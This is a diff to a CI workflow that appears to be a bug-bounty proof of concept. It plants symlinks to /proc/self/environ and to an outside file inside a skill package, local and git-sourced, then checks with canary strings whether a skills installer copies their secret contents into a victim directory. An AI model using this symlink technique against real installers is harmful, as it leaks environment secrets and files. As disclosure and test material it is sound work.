@@ -42,7 +42,9 @@ jobs:
           tmp="$(mktemp -d)"
           skill="$tmp/local-skill"
           victim="$tmp/victim-local"
+          outside="$tmp/outside-local-secret.txt"
           mkdir -p "$skill" "$victim"
+          printf 'CONTROLLED_OUTSIDE_FILE_LOCAL_20260520\n' > "$outside"
           cat > "$skill/SKILL.md" <<'SKILL'
           ---
           name: proc-env-local-poc
@@ -51,6 +53,7 @@ jobs:
 
           Controlled local symlink proof.
           SKILL
+          ln -s "$outside" "$skill/copied-outside-file.txt"
           ln -s /proc/self/environ "$skill/copied-proc-environ.bin"
 
           (
@@ -63,24 +66,29 @@ jobs:
               node "$GITHUB_WORKSPACE/target-skills/src/cli.ts" add "$skill" --copy --agent codex --yes
           )
 
-          installed="$victim/.agents/skills/proc-env-local-poc/copied-proc-environ.bin"
+          installed_outside="$victim/.agents/skills/proc-env-local-poc/copied-outside-file.txt"
+          installed_proc="$victim/.agents/skills/proc-env-local-poc/copied-proc-environ.bin"
           find "$victim/.agents/skills/proc-env-local-poc" -maxdepth 1 -printf '%f %y %s bytes -> %l\n'
-          if [ ! -e "$installed" ]; then
-            echo "installed proc environ copy is missing"
+          if [ ! -f "$installed_outside" ] || [ -L "$installed_outside" ]; then
+            echo "installed outside file was not copied as a regular file"
             exit 1
           fi
-          if [ -L "$installed" ]; then
-            echo "installed proc environ entry is still a symlink"
-            readlink "$installed"
+          if ! grep -Fx 'CONTROLLED_OUTSIDE_FILE_LOCAL_20260520' "$installed_outside"; then
+            echo "outside file canary was not present in copied file"
             exit 1
           fi
-          stat --format='local installed file type: %F, %s bytes' "$installed"
-          if ! tr '\0' '\n' < "$installed" | grep -Fx 'CONTROLLED_SKILLS_SECRET=CONTROLLED_SKILLS_SECRET_LOCAL_20260520'; then
-            echo "local canary was not present in copied file"
-            exit 1
+          if [ -e "$installed_proc" ] && [ ! -L "$installed_proc" ]; then
+            stat --format='local proc environ copy observation: %F, %s bytes' "$installed_proc"
+            if tr '\0' '\n' < "$installed_proc" | grep -Fx 'CONTROLLED_SKILLS_SECRET=CONTROLLED_SKILLS_SECRET_LOCAL_20260520'; then
+              echo "local proc environ canary was present"
+            else
+              echo "local proc environ canary was not present"
+            fi
+          else
+            echo "local proc environ copy was missing or still a symlink"
           fi
-          printf 'local installed file bytes: '
-          wc -c < "$installed"
+          printf 'local outside installed file bytes: '
+          wc -c < "$installed_outside"
 
       - name: Run git source symlink canary
         run: |
@@ -88,7 +96,9 @@ jobs:
           tmp="$(mktemp -d)"
           repo="$tmp/attacker-repo"
           victim="$tmp/victim-git"
+          outside="$tmp/outside-git-secret.txt"
           mkdir -p "$repo/skills/proc-env-git-poc" "$victim"
+          printf 'CONTROLLED_OUTSIDE_FILE_GIT_20260520\n' > "$outside"
           cat > "$repo/skills/proc-env-git-poc/SKILL.md" <<'SKILL'
           ---
           name: proc-env-git-poc
@@ -97,6 +107,7 @@ jobs:
 
           Controlled git symlink proof.
           SKILL
+          ln -s "$outside" "$repo/skills/proc-env-git-poc/copied-outside-file.txt"
           ln -s /proc/self/environ "$repo/skills/proc-env-git-poc/copied-proc-environ.bin"
           git -C "$repo" init
           git -C "$repo" config user.email "scioban@wearehackerone.com"
@@ -114,21 +125,26 @@ jobs:
               node "$GITHUB_WORKSPACE/target-skills/src/cli.ts" add "file://$repo" --skill proc-env-git-poc --copy --agent codex --yes
           )
 
-          installed="$victim/.agents/skills/proc-env-git-poc/copied-proc-environ.bin"
+          installed_outside="$victim/.agents/skills/proc-env-git-poc/copied-outside-file.txt"
+          installed_proc="$victim/.agents/skills/proc-env-git-poc/copied-proc-environ.bin"
           find "$victim/.agents/skills/proc-env-git-poc" -maxdepth 1 -printf '%f %y %s bytes -> %l\n'
-          if [ ! -e "$installed" ]; then
-            echo "installed proc environ copy is missing"
+          if [ ! -f "$installed_outside" ] || [ -L "$installed_outside" ]; then
+            echo "installed outside file was not copied as a regular file"
             exit 1
           fi
-          if [ -L "$installed" ]; then
-            echo "installed proc environ entry is still a symlink"
-            readlink "$installed"
+          if ! grep -Fx 'CONTROLLED_OUTSIDE_FILE_GIT_20260520' "$installed_outside"; then
+            echo "outside file canary was not present in copied file"
             exit 1
           fi
-          stat --format='git installed file type: %F, %s bytes' "$installed"
-          if ! tr '\0' '\n' < "$installed" | grep -Fx 'CONTROLLED_SKILLS_SECRET=CONTROLLED_SKILLS_SECRET_GIT_20260520'; then
-            echo "git canary was not present in copied file"
-            exit 1
+          if [ -e "$installed_proc" ] && [ ! -L "$installed_proc" ]; then
+            stat --format='git proc environ copy observation: %F, %s bytes' "$installed_proc"
+            if tr '\0' '\n' < "$installed_proc" | grep -Fx 'CONTROLLED_SKILLS_SECRET=CONTROLLED_SKILLS_SECRET_GIT_20260520'; then
+              echo "git proc environ canary was present"
+            else
+              echo "git proc environ canary was not present"
+            fi
+          else
+            echo "git proc environ copy was missing or still a symlink"
           fi
-          printf 'git installed file bytes: '
-          wc -c < "$installed"
+          printf 'git outside installed file bytes: '
+          wc -c < "$installed_outside"
